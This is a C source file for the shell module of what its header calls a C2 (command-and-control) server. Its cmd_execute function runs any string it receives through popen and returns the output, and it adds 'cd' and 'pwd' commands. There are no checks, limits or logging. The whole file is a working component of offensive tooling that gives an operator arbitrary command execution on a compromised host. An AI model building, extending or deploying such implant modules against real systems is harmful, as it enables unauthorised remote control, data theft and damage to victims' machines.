/**
 * @file shell_module.c
 * @brief Shell command execution module for C2 server
 */

#include "../include/module.h"
#include "../common/logger.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Module information
#define MODULE_NAME "shell"
#define MODULE_VERSION 1
#define MODULE_DESCRIPTION "Shell command execution module"

// Module commands
static module_command_t commands[] = {
    {
        .name = "execute",
        .description = "Execute shell command",
        .usage = "execute <command>"
    },
    {
        .name = "cd",
        .description = "Change directory",
        .usage = "cd <directory>"
    },
    {
        .name = "pwd",
        .description = "Print working directory",
        .usage = "pwd"
    }
};

// Module context
typedef struct {
    char* current_dir;
} shell_module_ctx_t;

/**
 * @brief Initialize module
 * 
 * @param module Module to initialize
 * @return status_t Status code
 */
status_t module_init(module_t* module) {
    if (module == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Create module context
    shell_module_ctx_t* ctx = (shell_module_ctx_t*)malloc(sizeof(shell_module_ctx_t));
    if (ctx == NULL) {
        return STATUS_ERROR_MEMORY;
    }
    
    // Initialize context
    ctx->current_dir = getcwd(NULL, 0);
    if (ctx->current_dir == NULL) {
        free(ctx);
        return STATUS_ERROR;
    }
    
    // Set module context
    module->context = ctx;
    
    // Set module information
    module->name = strdup(MODULE_NAME);
    module->version = MODULE_VERSION;
    module->description = strdup(MODULE_DESCRIPTION);
    module->state = MODULE_STATE_INITIALIZED;
    
    return STATUS_SUCCESS;
}

/**
 * @brief Shutdown module
 * 
 * @param module Module to shutdown
 * @return status_t Status code
 */
status_t module_shutdown(module_t* module) {
    if (module == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Free module context
    if (module->context != NULL) {
        shell_module_ctx_t* ctx = (shell_module_ctx_t*)module->context;
        
        if (ctx->current_dir != NULL) {
            free(ctx->current_dir);
        }
        
        free(ctx);
        module->context = NULL;
    }
    
    // Free module information
    if (module->name != NULL) {
        free(module->name);
        module->name = NULL;
    }
    
    if (module->description != NULL) {
        free(module->description);
        module->description = NULL;
    }
    
    return STATUS_SUCCESS;
}

/**
 * @brief Execute shell command
 * 
 * @param args Command arguments
 * @param result Pointer to store command result
 * @param result_len Pointer to store command result length
 * @return status_t Status code
 */
status_t cmd_execute(const char* args, uint8_t** result, size_t* result_len) {
    if (args == NULL || result == NULL || result_len == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Execute command
    FILE* pipe = popen(args, "r");
    if (pipe == NULL) {
        return STATUS_ERROR;
    }
    
    // Read command output
    char buffer[1024];
    size_t output_len = 0;
    size_t output_capacity = 1024;
    uint8_t* output = (uint8_t*)malloc(output_capacity);
    if (output == NULL) {
        pclose(pipe);
        return STATUS_ERROR_MEMORY;
    }
    
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        size_t buffer_len = strlen(buffer);
        
        // Resize output buffer if needed
        if (output_len + buffer_len > output_capacity) {
            output_capacity *= 2;
            uint8_t* new_output = (uint8_t*)realloc(output, output_capacity);
            if (new_output == NULL) {
                free(output);
                pclose(pipe);
                return STATUS_ERROR_MEMORY;
            }
            
            output = new_output;
        }
        
        // Append buffer to output
        memcpy(output + output_len, buffer, buffer_len);
        output_len += buffer_len;
    }
    
    // Close pipe
    pclose(pipe);
    
    // Set result
    *result = output;
    *result_len = output_len;
    
    return STATUS_SUCCESS;
}

/**
 * @brief Change directory
 * 
 * @param args Command arguments
 * @param result Pointer to store command result
 * @param result_len Pointer to store command result length
 * @return status_t Status code
 */
status_t cmd_cd(const char* args, uint8_t** result, size_t* result_len) {
    if (args == NULL || result == NULL || result_len == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Change directory
    if (chdir(args) != 0) {
        return STATUS_ERROR;
    }
    
    // Get new current directory
    char* new_dir = getcwd(NULL, 0);
    if (new_dir == NULL) {
        return STATUS_ERROR;
    }
    
    // Set result
    *result = (uint8_t*)new_dir;
    *result_len = strlen(new_dir);
    
    return STATUS_SUCCESS;
}

/**
 * @brief Print working directory
 * 
 * @param args Command arguments
 * @param result Pointer to store command result
 * @param result_len Pointer to store command result length
 * @return status_t Status code
 */
status_t cmd_pwd(const char* args, uint8_t** result, size_t* result_len) {
    if (result == NULL || result_len == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Get current directory
    char* current_dir = getcwd(NULL, 0);
    if (current_dir == NULL) {
        return STATUS_ERROR;
    }
    
    // Set result
    *result = (uint8_t*)current_dir;
    *result_len = strlen(current_dir);
    
    return STATUS_SUCCESS;
}

/**
 * @brief Get module commands
 * 
 * @param module Module to get commands from
 * @param commands_out Pointer to store commands array
 * @param count Pointer to store number of commands
 * @return status_t Status code
 */
status_t shell_module_get_commands(module_t* module, module_command_t*** commands_out, size_t* count) {
    if (module == NULL || commands_out == NULL || count == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Set function pointers
    commands[0].function = cmd_execute;
    commands[1].function = cmd_cd;
    commands[2].function = cmd_pwd;
    
    // Create copy of commands array
    size_t commands_count = sizeof(commands) / sizeof(commands[0]);
    module_command_t** commands_copy = (module_command_t**)malloc(commands_count * sizeof(module_command_t*));
    if (commands_copy == NULL) {
        return STATUS_ERROR_MEMORY;
    }
    
    for (size_t i = 0; i < commands_count; i++) {
        commands_copy[i] = &commands[i];
    }
    
    *commands_out = commands_copy;
    *count = commands_count;
    
    return STATUS_SUCCESS;
}
